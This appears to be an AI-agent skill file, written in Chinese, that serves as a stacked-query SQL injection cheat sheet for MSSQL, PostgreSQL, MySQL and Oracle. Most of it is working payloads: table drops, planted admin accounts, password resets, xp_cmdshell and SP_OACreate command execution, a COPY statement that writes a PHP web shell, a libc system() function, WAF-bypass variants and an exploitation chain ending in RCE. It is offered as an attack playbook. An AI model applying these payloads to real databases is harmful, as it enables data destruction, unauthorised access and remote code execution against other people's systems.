---
name: sqli-stacked
description: Use when encountering 堆叠查询注入技术 - mysql/mssql/postgresql多语句执行
---

# SQL注入攻击

## Info

- **Domain**: web
- **Tags**: web, sqli, stacked-queries, database

# 堆叠查询注入攻击

## 攻击思路
```
探测堆叠查询支持 → 构造多语句Payload → 执行DDL/DML命令 → 数据篡改/RCE获取
```

## 数据库堆叠查询支持矩阵

| 数据库 | 堆叠查询 | 分隔符 | 备注 |
|--------|----------|--------|------|
| MSSQL | 完全支持 | ; | xp_cmdshell RCE |
| PostgreSQL | 完全支持 | ; | COPY命令RCE |
| MySQL | PHP默认不支持 | ; | mysqli_multi_query支持 |
| Oracle | 需要匿名块 | ;或EXEC | PL/SQL执行 |
| SQLite | 不支持 | ; | 有限执行能力 |

## MSSQL堆叠查询攻击

```sql
-- 基础堆叠
'; DROP TABLE users;--
'; INSERT INTO users VALUES('hacker','password','admin');--
'; UPDATE users SET password='hacked' WHERE username='admin';--

-- xp_cmdshell RCE
'; EXEC master..xp_cmdshell 'whoami';--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

-- SP_OACreate替代
'; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;
'; DECLARE @shell INT; EXEC SP_OACREATE 'wscript.shell',@shell OUTPUT;
'; EXEC SP_OAMETHOD @shell,'run',NULL,'cmd /c whoami';--
```

## PostgreSQL堆叠查询攻击

```sql
-- 基础堆叠
'; DROP TABLE users;--
'; CREATE TABLE hacked(id INT);--

-- COPY命令写入文件
'; COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php';--

-- 通过扩展执行命令
'; CREATE OR REPLACE FUNCTION exec(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT;
'; SELECT exec('id');--
```

## MySQL堆叠查询攻击

```sql
-- PHP mysqli_multi_query支持时可用
'; DROP TABLE users;--
'; INSERT INTO users VALUES('hacker','password');--

-- 利用预处理语句绕过
'; SET @sql='DROP TABLE users'; PREPARE stmt FROM @sql; EXECUTE stmt;--

-- 通过自定义函数(需UDF)
'; SELECT sys_exec('id');--
```

## 堆叠查询高级利用

| 利用目标 | Payload示例 |
|----------|-------------|
| 数据修改 | '; UPDATE users SET role='admin' WHERE id=1;-- |
| 数据插入 | '; INSERT INTO logs VALUES('恶意数据');-- |
| 表结构修改 | '; ALTER TABLE users ADD COLUMN hacked VARCHAR(100);-- |
| 权限操作 | '; GRANT ALL ON *.* TO 'hacker'@'%';-- |
| 文件操作 | '; SELECT * INTO OUTFILE '/tmp/data.txt' FROM users;-- |

## WAF绕过技术

| 绕过方法 | Payload |
|----------|---------|
| 注释混淆 | ';/**/EXEC/**/xp_cmdshell/**/'whoami';-- |
| 编码绕过 | '; EXEC%20xp_cmdshell%20'whoami';-- |
| NULL字节 | ';%00EXEC xp_cmdshell 'whoami';-- |
| 动态SQL | '; EXEC('xp_cmdshell ''whoami''');-- |

```sql
-- 动态SQL绕过
'; DECLARE @cmd VARCHAR(255); SET @cmd='whoami';
'; EXEC('EXEC xp_cmdshell ''' + @cmd + '''');--
```

## 检测堆叠查询支持

```sql
-- 测试Payload
'; SELECT 1; SELECT 2;--
'; IF(1=1) SELECT 1 ELSE SELECT 2;--

-- 时间盲注检测
'; WAITFOR DELAY '0:0:5';--   (MSSQL)
'; SELECT pg_sleep(5);--      (PostgreSQL)
'; SELECT SLEEP(5);--         (MySQL)
```

## 利用链选择

```
1. MSSQL: xp_cmdshell → 命令执行 → RCE
2. PostgreSQL: COPY → 文件写入 → WebShell
3. MySQL: INTO OUTFILE → 文件写入 → WebShell(需要FILE权限)
4. Oracle: Java存储过程 → 命令执行
```